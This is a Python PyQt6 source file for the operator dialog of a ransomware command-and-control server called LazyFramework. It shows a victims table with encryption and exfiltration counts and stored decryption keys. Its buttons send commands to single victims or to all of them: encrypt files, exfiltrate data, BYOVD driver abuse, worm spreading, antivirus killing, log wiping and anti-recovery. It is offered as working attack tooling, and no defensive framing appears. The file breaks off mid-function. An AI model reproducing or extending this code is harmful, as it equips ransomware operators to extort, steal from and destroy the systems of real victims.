# widgets/c2_dialog.py

from PyQt6.QtWidgets import (
    QDialog,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QGroupBox,
    QFormLayout,
    QMessageBox,
    QWidget,
    QTabWidget,
    QTextEdit,
    QListWidget,
    QListWidgetItem,
    QSplitter,
    QTableWidget,
    QTableWidgetItem,
    QHeaderView,
    QScrollArea,
    QFrame,
    QCheckBox,
    QSpinBox,
    QComboBox,
    QAbstractItemView,
    QGridLayout,
    QMainWindow,
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt6.QtGui import QFont, QColor

import json
import threading
import time
import socket
import os
import sys
import subprocess
import traceback
from datetime import datetime

# ==================== C2 SERVER THREAD ====================


class C2ServerThread(QThread):
    """Worker thread untuk C2 Server"""

    output = pyqtSignal(str)
    victim_update = pyqtSignal(dict)

    def __init__(self, host, port, web_port, password, username="admin"):
        super().__init__()
        self.host = host
        self.port = port
        self.web_port = web_port
        self.password = password
        self.username = username
        self.server = None
        self.running = False
        self._poller_thread = None

    def run(self):
        try:
            from modules.payload.c2_server import C2Server

            self.server = C2Server(
                self.host, self.port, self.web_port, self.password, self.username
            )
            self.running = True

            self.output.emit(f"[*] C2 Server starting on {self.host}:{self.port}")
            self.output.emit(f"[*] Web panel: http://{self.host}:{self.web_port}")
            self.output.emit(f"[*] Username: {self.username}")
            self.output.emit(f"[*] Password: {self.password}")
            self.output.emit(f"[*] Hybrid victim log: {self.server.hybrid_victims_log}")
            self.output.emit("[*] Waiting for victims...")

            self._start_stats_poller()
            self.server.start()

        except Exception as e:
            self.output.emit(f"[!] Error: {e}")
            self.output.emit(traceback.format_exc())
            self.running = False

    def _start_stats_poller(self):
        def _poller():
            poll_count = 0
            while self.running:
                try:
                    if self.server:
                        acquired = self.server.lock.acquire(timeout=1.0)
                        if not acquired:
                            self.output.emit("[!] Poller: lock timeout, retrying...")
                            time.sleep(0.5)
                            continue

                        try:
                            victims = {}
                            for vid, v in self.server.victims.items():
                                victims[vid] = {
                                    "id": vid,
                                    "ip": v.get("ip", "?"),
                                    "port": v.get("port", "?"),
                                    "hostname": v.get("hostname", "unknown"),
                                    "os": v.get("os", "unknown"),
                                    "user": v.get("user", "unknown"),
                                    "is_admin": v.get("is_admin", False),
                                    "status": v.get("status", "unknown"),
                                    "encrypted": v.get("encrypted", False),
                                    "encrypted_count": v.get("encrypted_count", 0),
                                    "exfiltrated_count": v.get("exfiltrated_count", 0),
                                    "byovd_enabled": v.get("byovd_enabled", False),
                                    "smb_worm_enabled": v.get(
                                        "smb_worm_enabled", False
                                    ),
                                    "av_bypass": v.get("av_bypass", False),
                                    "decrypt_key": v.get("decrypt_key", ""),
                                    "encryption": v.get("encryption", ""),
                                    "encryption_mode": v.get(
                                        "encryption_mode", "unknown"
                                    ),
                                    "victim_id": v.get("victim_id", ""),
                                    "key_fingerprint": v.get("key_fingerprint", ""),
                                }

                            hybrid_count = sum(
                                1
                                for v in self.server.victims.values()
                                if v.get("encryption_mode") == "hybrid"
                            )
                            legacy_count = sum(
                                1
                                for v in self.server.victims.values()
                                if v.get("encryption_mode") == "legacy"
                            )

                            stats = {
                                "total": len(self.server.victims),
                                "online": sum(
                                    1
                                    for v in self.server.victims.values()
                                    if v.get("status")
                                    in [
                                        "registered",
                                        "active",
                                        "encrypted",
                                        "decrypted",
                                    ]
                                ),
                                "admin": sum(
                                    1
                                    for v in self.server.victims.values()
                                    if v.get("is_admin")
                                ),
                                "encrypted": sum(
                                    1
                                    for v in self.server.victims.values()
                                    if v.get("encrypted")
                                ),
                                "files": sum(
                                    v.get("encrypted_count", 0)
                                    for v in self.server.victims.values()
                                ),
                                "exfiltrated": sum(
                                    v.get("exfiltrated_count", 0)
                                    for v in self.server.victims.values()
                                ),
                                "hybrid": hybrid_count,
                                "legacy": legacy_count,
                            }
                            history = list(self.server.command_history[-50:])
                        finally:
                            self.server.lock.release()

                        try:
                            self.victim_update.emit(
                                {"victims": victims, "stats": stats, "history": history}
                            )
                        except Exception as e:
                            self.output.emit(f"[!] Signal emit error: {e}")

                        poll_count += 1
                        if poll_count % 10 == 1:
                            self.output.emit(
                                f"[dim]Poller: {stats['total']} victims, "
                                f"{stats['online']} online, "
                                f"{stats['hybrid']} hybrid[/]"
                            )

                except Exception as e:
                    self.output.emit(f"[!] Poller error: {e}")

                time.sleep(2)

        self._poller_thread = threading.Thread(target=_poller, daemon=True)
        self._poller_thread.start()

    def send_command(self, client_id, command):
        if self.server:
            return self.server.send_command(client_id, command)
        return False, "Server not running"

    def send_command_all(self, command):
        if self.server:
            return self.server.send_command_all(command)
        return []

    def stop(self):
        self.running = False
        if self.server:
            self.server.stop()


# ==================== C2 DIALOG ====================


class C2Dialog(QDialog):
    """C2 Server Dialog v6.1 - Split Layout with Separate Console Window"""

    def __init__(self, framework=None, parent=None):
        super().__init__(parent)
        self.framework = framework
        self.setWindowTitle("🖥 LazyFramework C2 Server")
        self.setModal(False)
        self.setMinimumSize(1700, 950)

        self.server_thread = None
        self.victims_data = {}
        self.stats_data = {}
        self.current_selected_victim = None
        self._exfil_refresh_counter = 0
        self._fallback_timer = None
        self._console_window = None

        self._build_ui()
        self._start_ui_refresh()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(6)
        layout.setContentsMargins(8, 8, 8, 8)

        # ═══════════════ TITLE BAR ═══════════════
        title_widget = QWidget()
        title_widget.setFixedHeight(48)
        title_widget.setStyleSheet("""
            QWidget {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #0a1a0a, stop:0.5 #0a2a0a, stop:1 #0a1a0a);
                border-radius: 4px;
                border: 1px solid #00ff00;
            }
        """)
        title_layout = QHBoxLayout(title_widget)
        title_layout.setContentsMargins(15, 5, 15, 5)
        title_layout.setSpacing(10)

        title = QLabel("🖥 LAZYFRAMEWORK")
        title.setStyleSheet(
            "color: #00ff00; font-size: 15pt; font-weight: bold; border: none;"
        )
        title_layout.addWidget(title)

        hybrid_badge = QLabel("COMMANDER")
        hybrid_badge.setStyleSheet("""
            color: #00ff00;
            font-size: 8pt;
            font-weight: bold;
            background: rgba(0, 255, 0, 0.15);
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 2px 10px;
        """)
        title_layout.addWidget(hybrid_badge)

        auth_badge = QLabel("🔒 AUTH")
        auth_badge.setStyleSheet("""
            color: #00ffff;
            font-size: 8pt;
            font-weight: bold;
            background: rgba(0, 255, 255, 0.15);
            border: 1px solid #00ffff;
            border-radius: 10px;
            padding: 2px 10px;
        """)
        title_layout.addWidget(auth_badge)

        title_layout.addStretch()

        # Tombol buka console window
        self.open_console_btn = QPushButton("📟 Console / Monitor Window")
        self.open_console_btn.setFixedHeight(32)
        self.open_console_btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #1f6feb, stop:1 #0d419d);
                color: white;
                font-weight: bold;
                padding: 4px 14px;
                border: 1px solid #388bfd;
                border-radius: 4px;
                font-size: 9pt;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #388bfd, stop:1 #1f6feb);
            }
        """)
        self.open_console_btn.clicked.connect(self._open_console_window)
        title_layout.addWidget(self.open_console_btn)

        self.status_indicator = QLabel("● Stopped")
        self.status_indicator.setStyleSheet(
            "color: #ff5555; font-size: 10pt; font-weight: bold; border: none;"
        )
        title_layout.addWidget(self.status_indicator)

        layout.addWidget(title_widget)

        # ═══════════════ MAIN SPLIT ═══════════════
        main_split = QSplitter(Qt.Orientation.Horizontal)

        # ─── LEFT: CONFIG PANEL ───
        config_widget = self._build_config_panel()
        main_split.addWidget(config_widget)

        # ─── RIGHT: STATS + VICTIMS + ACTIONS ───
        right_widget = QWidget()
        right_layout = QVBoxLayout(right_widget)
        right_layout.setContentsMargins(0, 0, 0, 0)
        right_layout.setSpacing(6)

        # Stats (2 rows × 4 cols)
        stats_widget = self._build_stats_panel()
        right_layout.addWidget(stats_widget, 0)

        # Victims table + selected actions side-by-side
        victims_split = QSplitter(Qt.Orientation.Horizontal)

        # Victims table (kiri)
        victims_table_widget = self._build_victims_table()
        victims_split.addWidget(victims_table_widget)

        # Selected victim actions (kanan)
        actions_widget = self._build_selected_actions_panel()
        victims_split.addWidget(actions_widget)

        victims_split.setSizes([950, 400])
        victims_split.setStretchFactor(0, 3)
        victims_split.setStretchFactor(1, 1)
        right_layout.addWidget(victims_split, 1)

        # Bulk actions (bawah)
        bulk_widget = self._build_bulk_actions_panel()
        right_layout.addWidget(bulk_widget, 0)

        main_split.addWidget(right_widget)
        main_split.setSizes([380, 1320])
        main_split.setStretchFactor(0, 0)
        main_split.setStretchFactor(1, 1)

        layout.addWidget(main_split, 1)

        # ═══════════════ BOTTOM INFO ═══════════════
        bottom = QLabel(
            "💡 Selected Victim Actions (kanan) untuk command per-victim. "
            "Bulk Actions (bawah) untuk semua victim. "
            "Console/Hybrid/History/Exfil dibuka via tombol 📟 di title bar."
        )
        bottom.setStyleSheet(
            "color: #666666; font-size: 8pt; padding: 4px; "
            "background: #0a0a0a; border-radius: 3px;"
        )
        bottom.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(bottom)

    # ═══════════════════════════════════════════════════════════════
    # CONFIG PANEL (LEFT)
    # ═══════════════════════════════════════════════════════════════

    def _build_config_panel(self):
        panel = QWidget()
        panel.setMaximumWidth(400)
        layout = QVBoxLayout(panel)
        layout.setSpacing(6)
        layout.setContentsMargins(4, 4, 4, 4)

        # ═══════════════ SERVER CONFIG ═══════════════
        config_group = QGroupBox("🔧 Server Configuration")
        config_group.setStyleSheet(self._group_style("#00ff00"))
        config_layout = QFormLayout()
        config_layout.setSpacing(5)
        config_layout.setContentsMargins(10, 14, 10, 8)

        self.host_input = QLineEdit()
        self.host_input.setText("0.0.0.0")
        self.host_input.setPlaceholderText("Listen host")
        self.host_input.setFixedHeight(28)
        self.host_input.setStyleSheet(self._input_style())
        config_layout.addRow("Listen Host:", self.host_input)

        self.port_input = QLineEdit()
        self.port_input.setText("4444")
        self.port_input.setPlaceholderText("C2 TCP port")
        self.port_input.setFixedHeight(28)
        self.port_input.setStyleSheet(self._input_style())
        config_layout.addRow("Listen Port:", self.port_input)

        self.web_port_input = QLineEdit()
        self.web_port_input.setText("5000")
        self.web_port_input.setPlaceholderText("Web panel port")
        self.web_port_input.setFixedHeight(28)
        self.web_port_input.setStyleSheet(self._input_style())
        config_layout.addRow("Web Panel Port:", self.web_port_input)

        config_group.setLayout(config_layout)
        layout.addWidget(config_group)

        # ═══════════════ AUTH CONFIG ═══════════════
        auth_group = QGroupBox("🔒 Authentication")
        auth_group.setStyleSheet(self._group_style("#00ffff"))
        auth_layout = QFormLayout()
        auth_layout.setSpacing(5)
        auth_layout.setContentsMargins(10, 14, 10, 8)

        self.username_input = QLineEdit()
        self.username_input.setText("admin")
        self.username_input.setPlaceholderText("Login username")
        self.username_input.setFixedHeight(28)
        self.username_input.setStyleSheet(self._input_style())
        auth_layout.addRow("Username:", self.username_input)

        # Password dengan show/hide toggle
        password_row = QHBoxLayout()
        password_row.setSpacing(4)

        self.password_input = QLineEdit()
        self.password_input.setText("admin")
        self.password_input.setPlaceholderText("Login password")
        self.password_input.setFixedHeight(28)
        self.password_input.setEchoMode(QLineEdit.EchoMode.Password)
        self.password_input.setStyleSheet(self._input_style())
        password_row.addWidget(self.password_input, 1)

        self.toggle_pw_btn = QPushButton("👁")
        self.toggle_pw_btn.setFixedSize(28, 28)
        self.toggle_pw_btn.setCheckable(True)
        self.toggle_pw_btn.setStyleSheet("""
            QPushButton {
                background: #1a1a1a;
                color: #00ffff;
                border: 1px solid #00ffff;
                border-radius: 3px;
                font-size: 12pt;
            }
            QPushButton:hover { background: #0a2a2a; }
            QPushButton:checked { background: #00ffff; color: #000; }
        """)
        self.toggle_pw_btn.clicked.connect(self._toggle_password_visibility)
        password_row.addWidget(self.toggle_pw_btn)

        auth_layout.addRow("Password:", password_row)

        auth_warn = QLabel("⚠ Change default credentials before deploy!")
        auth_warn.setStyleSheet(
            "color: #ffaa00; font-size: 8pt; padding: 4px; "
            "background: rgba(255, 170, 0, 0.1); border-radius: 3px;"
        )
        auth_warn.setWordWrap(True)
        auth_layout.addRow("", auth_warn)

        auth_group.setLayout(auth_layout)
        layout.addWidget(auth_group)

        # ═══════════════ BUTTONS ═══════════════
        btn_layout = QVBoxLayout()
        btn_layout.setSpacing(5)

        self.start_btn = QPushButton("▶ Start C2 Server")
        self.start_btn.setMinimumHeight(42)
        self.start_btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #00ff00, stop:1 #00aa00);
                color: #000;
                font-weight: bold;
                font-size: 11pt;
                padding: 8px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #44ff44, stop:1 #00cc00);
            }
            QPushButton:disabled { background: #333; color: #666; }
        """)
        self.start_btn.clicked.connect(self._start_server)
        btn_layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("⏹ Stop C2 Server")
        self.stop_btn.setMinimumHeight(42)
        self.stop_btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #da3633, stop:1 #a31515);
                color: white;
                font-weight: bold;
                font-size: 11pt;
                padding: 8px;
                border: none;
                border-radius: 4px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #f85149, stop:1 #c72e2e);
            }
            QPushButton:disabled { background: #333; color: #666; }
        """)
        self.stop_btn.clicked.connect(self._stop_server)
        self.stop_btn.setEnabled(False)
        btn_layout.addWidget(self.stop_btn)

        layout.addLayout(btn_layout)

        # ═══════════════ QUICK ACTIONS ═══════════════
        quick_group = QGroupBox("⚡ Quick Actions")
        quick_group.setStyleSheet(self._group_style("#ffaa00"))
        quick_layout = QVBoxLayout()
        quick_layout.setSpacing(5)
        quick_layout.setContentsMargins(8, 14, 8, 8)

        self.open_web_btn = QPushButton("🌐 Open Web Panel")
        self.open_web_btn.setMinimumHeight(32)
        self.open_web_btn.setStyleSheet("""
            QPushButton {
                background: #1f6feb;
                color: white;
                font-weight: bold;
                padding: 6px;
                border: none;
                border-radius: 4px;
                font-size: 9pt;
            }
            QPushButton:hover { background: #388bfd; }
        """)
        self.open_web_btn.clicked.connect(self._open_web_panel)
        quick_layout.addWidget(self.open_web_btn)

        self.open_exfil_btn = QPushButton("📂 Open Exfil Folder")
        self.open_exfil_btn.setMinimumHeight(32)
        self.open_exfil_btn.setStyleSheet("""
            QPushButton {
                background: #238636;
                color: white;
                font-weight: bold;
                padding: 6px;
                border: none;
                border-radius: 4px;
                font-size: 9pt;
            }
            QPushButton:hover { background: #2ea043; }
        """)
        self.open_exfil_btn.clicked.connect(self._open_exfil_folder)
        quick_layout.addWidget(self.open_exfil_btn)

        self.open_keys_btn = QPushButton("🔑 Open Keys Folder")
        self.open_keys_btn.setMinimumHeight(32)
        self.open_keys_btn.setStyleSheet("""
            QPushButton {
                background: #6e40c9;
                color: white;
                font-weight: bold;
                padding: 6px;
                border: none;
                border-radius: 4px;
                font-size: 9pt;
            }
            QPushButton:hover { background: #8957e5; }
        """)
        self.open_keys_btn.clicked.connect(self._open_keys_folder)
        quick_layout.addWidget(self.open_keys_btn)

        self.open_access_log_btn = QPushButton("📋 Open Access Log")
        self.open_access_log_btn.setMinimumHeight(32)
        self.open_access_log_btn.setStyleSheet("""
            QPushButton {
                background: #555555;
                color: white;
                font-weight: bold;
                padding: 6px;
                border: none;
                border-radius: 4px;
                font-size: 9pt;
            }
            QPushButton:hover { background: #777777; }
        """)
        self.open_access_log_btn.clicked.connect(self._open_access_log)
        quick_layout.addWidget(self.open_access_log_btn)

        quick_group.setLayout(quick_layout)
        layout.addWidget(quick_group)

        layout.addStretch()

        return panel

    def _toggle_password_visibility(self):
        if self.toggle_pw_btn.isChecked():
            self.password_input.setEchoMode(QLineEdit.EchoMode.Normal)
            self.toggle_pw_btn.setText("🙈")
        else:
            self.password_input.setEchoMode(QLineEdit.EchoMode.Password)
            self.toggle_pw_btn.setText("👁")

    # ═══════════════════════════════════════════════════════════════
    # STATS PANEL
    # ═══════════════════════════════════════════════════════════════

    def _build_stats_panel(self):
        panel = QWidget()
        panel.setFixedHeight(160)
        layout = QGridLayout(panel)
        layout.setSpacing(6)
        layout.setContentsMargins(0, 0, 0, 0)

        self.stat_boxes = {}

        stats_config = [
            ("total", "Total Victims", "#00ff00"),
            ("online", "Online", "#00ffff"),
            ("admin", "Admin/SYSTEM", "#ffff00"),
            ("hybrid", "Hybrid Mode", "#00ff00"),
            ("legacy", "Legacy Mode", "#ffaa00"),
            ("encrypted", "Encrypted", "#ff5555"),
            ("files", "Files Encrypted", "#ffaa00"),
            ("exfiltrated", "Files Exfiltrated", "#ff00ff"),
        ]

        for i, (key, label, color) in enumerate(stats_config):
            box = QWidget()
            box.setStyleSheet(f"""
                QWidget {{
                    background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                        stop:0 #1a1a1a, stop:1 #0d0d0d);
                    border: 1px solid {color};
                    border-radius: 4px;
                }}
            """)
            box_layout = QVBoxLayout(box)
            box_layout.setContentsMargins(15, 10, 15, 10)
            box_layout.setSpacing(2)

            lbl = QLabel(label)
            lbl.setStyleSheet(f"""
                color: {color};
                font-size: 8pt;
                font-weight: bold;
                background: transparent;
                border: none;
                letter-spacing: 1px;
            """)
            lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            box_layout.addWidget(lbl)

            val = QLabel("0")
            val.setStyleSheet(f"""
                color: {color};
                font-size: 22pt;
                font-weight: bold;
                background: transparent;
                border: none;
            """)
            val.setAlignment(Qt.AlignmentFlag.AlignCenter)
            box_layout.addWidget(val)

            self.stat_boxes[key] = val

            row = i // 4
            col = i % 4
            layout.addWidget(box, row, col)

        return panel

    # ═══════════════════════════════════════════════════════════════
    # VICTIMS TABLE
    # ═══════════════════════════════════════════════════════════════

    def _build_victims_table(self):
        container = QWidget()
        layout = QVBoxLayout(container)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(4)

        header = QLabel("👥 Connected Victims")
        header.setStyleSheet(
            "color: #00ffff; font-size: 11pt; font-weight: bold; padding: 3px;"
        )
        layout.addWidget(header)

        self.victims_table = QTableWidget()
        self.victims_table.setColumnCount(13)
        self.victims_table.setHorizontalHeaderLabels(
            [
                "ID",
                "IP:Port",
                "Hostname",
                "OS",
                "User",
                "Admin",
                "Features",
                "Status",
                "Enc",
                "Exfil",
                "Victim ID",
                "Fingerprint",
                "Mode",
            ]
        )
        self.victims_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Interactive
        )
        self.victims_table.setSelectionBehavior(
            QAbstractItemView.SelectionBehavior.SelectRows
        )
        self.victims_table.setSelectionMode(
            QAbstractItemView.SelectionMode.SingleSelection
        )
        self.victims_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.victims_table.setAlternatingRowColors(True)
        self.victims_table.setStyleSheet("""
            QTableWidget {
                background: #0d1117;
                alternate-background-color: #0a0d12;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 4px;
                gridline-color: #1a1a1a;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
            }
            QTableWidget::item { padding: 4px; }
            QTableWidget::item:selected {
                background: #1f6feb;
                color: #ffffff;
            }
            QHeaderView::section {
                background: #1a1a1a;
                color: #00ff00;
                padding: 6px;
                border: none;
                border-bottom: 2px solid #00ff00;
                border-right: 1px solid #222;
                font-weight: bold;
                font-size: 9pt;
            }
        """)
        self.victims_table.itemSelectionChanged.connect(self._on_victim_selected)

        widths = [70, 115, 115, 65, 85, 50, 95, 85, 45, 45, 85, 85, 65]
        for i, w in enumerate(widths):
            self.victims_table.setColumnWidth(i, w)

        layout.addWidget(self.victims_table)

        return container

    # ═══════════════════════════════════════════════════════════════
    # SELECTED ACTIONS PANEL (RIGHT of victims table)
    # ═══════════════════════════════════════════════════════════════

    def _build_selected_actions_panel(self):
        container = QWidget()
        container.setStyleSheet("""
            QWidget {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #0f0f0f, stop:1 #080808);
                border: 1px solid #333;
                border-radius: 4px;
            }
        """)
        outer_layout = QVBoxLayout(container)
        outer_layout.setSpacing(0)
        outer_layout.setContentsMargins(0, 0, 0, 0)

        # Scroll area (kalau terlalu tinggi)
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QFrame.Shape.NoFrame)
        scroll.setStyleSheet("""
            QScrollArea {
                border: none;
                background: transparent;
            }
            QScrollBar:vertical {
                background: #1a1a1a;
                width: 6px;
                border-radius: 3px;
            }
            QScrollBar::handle:vertical {
                background: #333;
                border-radius: 3px;
                min-height: 20px;
            }
            QScrollBar::handle:vertical:hover { background: #555; }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0; }
        """)

        inner = QWidget()
        inner.setStyleSheet("background: transparent;")
        layout = QVBoxLayout(inner)
        layout.setSpacing(6)
        layout.setContentsMargins(10, 10, 10, 10)

        # Header
        sel_label = QLabel("🎯 Selected Victim")
        sel_label.setStyleSheet(
            "color: #ffff00; font-size: 11pt; font-weight: bold; "
            "border: none; background: transparent; padding-bottom: 4px;"
        )
        layout.addWidget(sel_label)

        # Info selected
        self.selected_info_label = QLabel(
            "⚠ No victim selected\n\nClick a row in victims table"
        )
        self.selected_info_label.setStyleSheet(
            "color: #888888; font-size: 9pt; "
            "border: 1px solid #333; background: #0d0d0d; "
            "padding: 8px; border-radius: 3px;"
        )
        self.selected_info_label.setWordWrap(True)
        self.selected_info_label.setMinimumHeight(60)
        layout.addWidget(self.selected_info_label)

        # ─── ENCRYPTION GROUP ───
        enc_group = QGroupBox("🔒 Encryption")
        enc_group.setStyleSheet(self._group_style("#ff5555"))
        enc_layout = QGridLayout()
        enc_layout.setSpacing(4)
        enc_layout.setContentsMargins(6, 14, 6, 6)

        self.sel_encrypt_btn = self._make_action_btn(
            "🔒 Encrypt", "#ff0000", lambda: self._send_to_selected("encrypt")
        )
        enc_layout.addWidget(self.sel_encrypt_btn, 0, 0)

        self.sel_decrypt_btn = self._make_action_btn(
            "🔓 Decrypt", "#00aaff", lambda: self._send_to_selected("decrypt")
        )
        enc_layout.addWidget(self.sel_decrypt_btn, 0, 1)

        self.sel_showgui_btn = self._make_action_btn(
            "🖥️ Show GUI", "#00ffff", lambda: self._send_to_selected("show_gui")
        )
        enc_layout.addWidget(self.sel_showgui_btn, 1, 0)

        self.sel_decryptgui_btn = self._make_action_btn(
            "🔓 Decrypt GUI", "#00ffff", lambda: self._send_to_selected("decrypt_gui")
        )
        enc_layout.addWidget(self.sel_decryptgui_btn, 1, 1)

        enc_group.setLayout(enc_layout)
        layout.addWidget(enc_group)

        # ─── INFORMATION GROUP ───
        info_group = QGroupBox("📊 Information")
        info_group.setStyleSheet(self._group_style("#00ffff"))
        info_layout = QGridLayout()
        info_layout.setSpacing(4)
        info_layout.setContentsMargins(6, 14, 6, 6)

        self.sel_status_btn = self._make_action_btn(
            "📊 Status", "#1f6feb", lambda: self._send_to_selected("status")
        )
        info_layout.addWidget(self.sel_status_btn, 0, 0)

        self.sel_ping_btn = self._make_action_btn(
            "🏓 Ping", "#00ffff", lambda: self._send_to_selected("ping")
        )
        info_layout.addWidget(self.sel_ping_btn, 0, 1)

        self.sel_wp_btn = self._make_action_btn(
            "🖼️ Wallpaper", "#00aaff", lambda: self._send_to_selected("wallpaper")
        )
        info_layout.addWidget(self.sel_wp_btn, 1, 0)

        self.sel_note_btn = self._make_action_btn(
            "📝 Note", "#00aaff", lambda: self._send_to_selected("note")
        )
        info_layout.addWidget(self.sel_note_btn, 1, 1)

        info_group.setLayout(info_layout)
        layout.addWidget(info_group)

        # ─── ATTACK GROUP ───
        attack_group = QGroupBox("⚔️ Attack")
        attack_group.setStyleSheet(self._group_style("#ff6600"))
        attack_layout = QGridLayout()
        attack_layout.setSpacing(4)
        attack_layout.setContentsMargins(6, 14, 6, 6)

        self.sel_byovd_btn = self._make_action_btn(
            "🔧 BYOVD", "#ff6600", lambda: self._send_to_selected("byovd")
        )
        attack_layout.addWidget(self.sel_byovd_btn, 0, 0)

        self.sel_spread_btn = self._make_action_btn(
            "🌐 Spread", "#bd93f9", lambda: self._send_to_selected("spread")
        )
        attack_layout.addWidget(self.sel_spread_btn, 0, 1)

        self.sel_avkill_btn = self._make_action_btn(
            "☠ AV Kill", "#ff0055", lambda: self._send_to_selected("av_kill")
        )
        attack_layout.addWidget(self.sel_avkill_btn, 1, 0, 1, 2)

        attack_group.setLayout(attack_layout)
        layout.addWidget(attack_group)

        # ─── CLEANUP GROUP ───
        cleanup_group = QGroupBox("🧹 Cleanup & Exfil")
        cleanup_group.setStyleSheet(self._group_style("#ffaa00"))
        cleanup_layout = QGridLayout()
        cleanup_layout.setSpacing(4)
        cleanup_layout.setContentsMargins(6, 14, 6, 6)

        self.sel_exfil_btn = self._make_action_btn(
            "📤 Exfiltrate", "#ff00ff", lambda: self._send_to_selected("exfiltrate")
        )
        cleanup_layout.addWidget(self.sel_exfil_btn, 0, 0)

        self.sel_wipe_btn = self._make_action_btn(
            "🧹 Wipe Logs", "#ffaa00", lambda: self._send_to_selected("wipe_logs")
        )
        cleanup_layout.addWidget(self.sel_wipe_btn, 0, 1)

        self.sel_antirec_btn = self._make_action_btn(
            "🔄 Anti-Rec", "#ffaa00", lambda: self._send_to_selected("anti_recovery")
        )
        cleanup_layout.addWidget(self.sel_antirec_btn, 1, 0)

        self.sel_kill_btn = self._make_action_btn(
            "✕ Kill", "#a31515", lambda: self._confirm_kill_selected()
        )
        cleanup_layout.addWidget(self.sel_kill_btn, 1, 1)

        cleanup_group.setLayout(cleanup_layout)
        layout.addWidget(cleanup_group)

        layout.addStretch()

        scroll.setWidget(inner)
        outer_layout.addWidget(scroll)

        return container

    # ═══════════════════════════════════════════════════════════════
    # BULK ACTIONS PANEL (BOTTOM)
    # ═══════════════════════════════════════════════════════════════

    def _build_bulk_actions_panel(self):
        container = QWidget()
        container.setStyleSheet("""
            QWidget {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #1a0a1a, stop:1 #0d050d);
                border: 1px solid #ff00ff;
                border-radius: 4px;
            }
        """)
        layout = QVBoxLayout(container)
        layout.setSpacing(4)
        layout.setContentsMargins(10, 8, 10, 8)

        bulk_label = QLabel("⚡ Bulk Actions — Send to ALL Victims")
        bulk_label.setStyleSheet(
            "color: #ff00ff; font-size: 10pt; font-weight: bold; "
            "border: none; background: transparent;"
        )
        layout.addWidget(bulk_label)

        row = QHBoxLayout()
        row.setSpacing(5)

        self.all_status_btn = self._make_bulk_btn(
            "📊 Status All", "#1f6feb", lambda: self._send_to_all("status")
        )
        row.addWidget(self.all_status_btn)

        self.all_ping_btn = self._make_bulk_btn(
            "🏓 Ping All", "#00ffff", lambda: self._send_to_all("ping")
        )
        row.addWidget(self.all_ping_btn)

        self.all_byovd_btn = self._make_bulk_btn(
            "🔧 BYOVD", "#ff6600", lambda: self._send_to_all("byovd")
        )
        row.addWidget(self.all_byovd_btn)

        self.all_spread_btn = self._make_bulk_btn(
            "🌐 Spread", "#bd93f9", lambda: self._send_to_all("spread")
        )
        row.addWidget(self.all_spread_btn)

        self.all_avkill_btn = self._make_bulk_btn(
            "☠ AV Kill", "#ff0055", lambda: self._send_to_all("av_kill")
        )
        row.addWidget(self.all_avkill_btn)

        self.all_showgui_btn = self._make_bulk_btn(
            "🖥️ Show GUI", "#00ffff", lambda: self._send_to_all("show_gui")
        )
        row.addWidget(self.all_showgui_btn)

        self.all_decryptgui_btn = self._make_bulk_btn(
            "🔓 Decrypt GUI", "#00ffff", lambda: self._send_to_all("decrypt_gui")
        )
        row.addWidget(self.all_decryptgui_btn)

        self.all_exfil_btn = self._make_bulk_btn(
            "📤 Exfil", "#ff00ff", lambda: self._send_to_all("exfiltrate")
        )
        row.addWidget(self.all_exfil_btn)

        self.all_wipe_btn = self._make_bulk_btn(
            "🧹 Wipe Logs", "#ffaa00", lambda: self._send_to_all("wipe_logs")
        )
        row.addWidget(self.all_wipe_btn)

        self.all_antirec_btn = self._make_bulk_btn(
            "🔄 Anti-Rec", "#ffaa00", lambda: self._send_to_all("anti_recovery")
        )
        row.addWidget(self.all_antirec_btn)

        row.addStretch()

        self.all_encrypt_btn = self._make_bulk_btn(
            "🔒 ENCRYPT ALL", "#a31515", lambda: self._confirm_encrypt_all()
        )
        self.all_encrypt_btn.setMinimumWidth(140)
        row.addWidget(self.all_encrypt_btn)

        self.all_decrypt_btn = self._make_bulk_btn(
            "🔓 Decrypt All", "#0e639c", lambda: self._confirm_decrypt_all()
        )
        row.addWidget(self.all_decrypt_btn)

        layout.addLayout(row)

        return container

    # ═══════════════════════════════════════════════════════════════
    # CONSOLE WINDOW (SEPARATE)
    # ═══════════════════════════════════════════════════════════════

    def _open_console_window(self):
        """Buka window console terpisah."""
        if self._console_window is not None:
            try:
                self._console_window.show()
                self._console_window.raise_()
                self._console_window.activateWindow()
                return
            except RuntimeError:
                # Window already deleted
                self._console_window = None

        win = QMainWindow(self)
        win.setWindowTitle("📟 C2 Console & Monitoring")
        win.setMinimumSize(1200, 700)
        win.setStyleSheet("""
            QMainWindow { background: #0a0a0a; }
        """)

        central = QWidget()
        win.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(6, 6, 6, 6)
